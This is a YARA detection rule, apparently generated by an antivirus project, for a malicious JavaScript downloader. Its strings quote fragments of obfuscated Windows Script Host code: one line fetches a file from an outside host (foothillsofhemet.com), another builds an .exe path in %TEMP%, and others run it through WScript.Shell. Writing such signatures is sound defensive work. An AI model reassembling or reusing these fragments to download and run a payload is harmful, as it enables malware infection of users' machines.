rule sig_20160328_d0c56e7bf2bdf81c52646477a00ba2d2 {
  meta:
    description = "datamaliciousorder - file 20160328_d0c56e7bf2bdf81c52646477a00ba2d2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "148d8205d91a81655791acfaf2aec22c8b2a56cd55ebb3c0e10b949350ffc799"

  strings:
    $s1  = "function Avbhveduii() {return Cmxvlrrr[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"MywLI2i43fSH5rzm.exe\";};" fullword ascii
    $s2  = "Spfkaa[Inrhkir](\"GET\", \"http://foothillsofhemet.com/k4sifs\", false);" fullword ascii
    $s3  = "do {WScript[Rhzjl](Elqxnp() * 11)} while (Spfkaa[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Cmxvlrrr = function Vrzuyr() {return WScript[Nefxcflwex](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Guwzev(Kdruucg, Sqeujytea){return Kdruucg - Sqeujytea;};" fullword ascii
    $s6  = "function Peayhrlodb() {return ((Btyfcs == true) && (Btyfcs == Cgbru)) ? 1 : Qqhhh;};" fullword ascii
    $s7  = "function Efrzwj(Ljyhgepkrk){Cmxvlrrr[\"Run\"](Ljyhgepkrk, Qqhhh, Qqhhh);};" fullword ascii
    $s8  = "Btyfcs = true; " fullword ascii
    $s9  = "function Kyuizinphf(){return Megkryubsn;};" fullword ascii
    $s10 = "var Cgbru = false;" fullword ascii
    $s11 = "function Kctqzul(){return Nefxcflwex;};" fullword ascii
    $s12 = "var Btyfcs = false;" fullword ascii
    $s13 = "function Lrqryrao(Nicklcgfso) {var Phxuksp = (1, 2, 3, 4, 5, Nicklcgfso); return Phxuksp;};" fullword ascii
    $s14 = "function Elqxnp(){return 22;};" fullword ascii
    $s15 = " while (Zwnaug){" fullword ascii
    $s16 = "function Patyw()" fullword ascii
    $s17 = "var Dlcyixa = new this[\"Date\"]();" fullword ascii
    $s18 = "var Nwfzyixp = false;" fullword ascii
    $s19 = "return Guwzev(Rqgqxgzd, Beaojlppy);" fullword ascii
    $s20 = "Cgbru = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}